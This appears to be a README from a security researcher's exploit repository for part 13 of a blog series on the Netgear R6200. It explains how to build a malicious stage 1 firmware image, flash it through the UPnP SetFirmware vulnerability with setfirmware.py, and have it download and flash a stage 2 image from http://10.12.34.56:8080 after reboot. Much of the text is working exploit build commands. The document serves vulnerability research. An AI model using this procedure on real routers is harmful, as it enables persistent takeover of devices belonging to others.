##Broken, Abandoned, and Forgotten Code, Part 13

This code corresponds with [part 13](http://shadow-file.blogspot.com) of the Broken, Abandoned, and Forgotten Code series. In this part we build a stage 1 firmware image that will circumvent the Netgear R6200 UPnP daemon's broken update code and, after rebooting, will download and flash a stage 2 image.

A build system to create the stage 1 firmware image can be found in exploit-src. However, there are a few pieces I didn't include due to licensing.

* Kernel image
* Root filesystem
* mtd writing utility from OpenWRT (GPL licensed)

You can extract the filesystem and kernel from a stock firmware image. I used and tested the Netgear firmware R6200-V1.0.0.28_1.0.24.chk:

    $ md5sum R6200-V1.0.0.28_1.0.24.chk
    0bbb9004c8cddf2d9602719c34c9e33e  R6200-V1.0.0.28_1.0.24.chk

Identify the offsets and sizes of the kernel and filesystem components using binwalk, and then extract them using `dd`:

     $ dd if=R6200-V1.0.0.28_1.0.24.chk of=squashfs.bin skip=1328446 bs=1
     $ dd if=R6200-V1.0.0.28_1.0.24.chk of=kernel-lzma.bin skip=86 bs=1 count=1328360

Put ``kernel-lzma.bin`` into exploit-src/.

Then, you'll need to generate a minimized root filesytem directory as described in [part 11](http://shadow-file.blogspot.com/2015/07/abandoned-part-11.html).

Tar up your minimized root filesystem, and put ``rootfs.tar.gz`` in exploit-src/stage1/src/.

The mtd writer is responsible for flashing the stage 2 firmware image. I have modified this utility from OpenWRT to work with this project. Check out the source and put it in place:

    $ git clone https://github.com/zcutlip/mtdwriter.git
    $ tar zcvf broken_abandoned/part_13/exploit-src/stage1/src/mtdwriter.tar.gz mtdwriter/

You'll also need a little endian MIPS gcc toolchain. Ensure ``mipsel-linux-gcc`` and friends are in your ``$PATH``.

With the missing pieces in place, you can build the stage 1 firmware:

    $ cd exploit-src/
    $ ./buildmips.sh

With this update, assuming you've generated a working, minimized firmware, you should be able to exploit the SetFirmware vulnerability, and flash your firmware image to the router:

``./setfirmware.py <stage_1_firmware.bin>``

Upon rebooting, the stage 1 firmware will attempt to download the second stage from ``http://10.12.34.56:8080/stage2mtd.bin``
